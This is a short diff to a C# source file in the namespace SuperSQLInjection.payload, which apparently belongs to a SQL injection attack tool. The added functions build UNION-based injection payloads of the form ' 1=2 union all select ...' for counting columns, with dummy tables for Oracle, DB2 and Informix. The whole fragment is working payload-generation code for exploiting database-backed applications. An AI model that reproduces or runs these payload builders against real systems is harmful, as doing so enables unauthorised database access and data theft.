@@ -48,6 +48,29 @@ namespace SuperSQLInjection.payload
 
         public static String unionColumnCountTestByOracle(int maxColumn,int testIndex,String fill)
         {
+            
+            return unionColumnCountTest(maxColumn,testIndex,fill) + " from dual";
+        }
+
+        public static String unionColumnCountTestByDB2(String unionTempaldate, String fill)
+        {
+            StringBuilder sb = new StringBuilder(" 1=2 union all select ");
+            sb.Append(unionTempaldate.Replace("{data}", fill));
+            sb.Append(" from sysibm.sysdummy1");
+            return sb.ToString();
+        }
+
+        public static String unionColumnCountTestByInformix(String unionTempaldate, String fill)
+        {
+            StringBuilder sb = new StringBuilder(" 1=2 union all select ");
+            sb.Append(unionTempaldate.Replace("{data}", fill));
+            sb.Append(" from sysmaster:sysdual");
+            return sb.ToString();
+        }
+
+
+        public static String unionColumnCountTest(int maxColumn, int testIndex, String fill)
+        {
             StringBuilder sb = new StringBuilder(" 1=2 union all select ");
             for (int i = 1; i <= maxColumn; i++)
             {
@@ -61,8 +84,9 @@ namespace SuperSQLInjection.payload
                 }
             }
             sb.Remove(sb.Length - 1, 1);
-            return sb.ToString() + " from dual";
+            return sb.ToString();
         }
+
 
 
     }
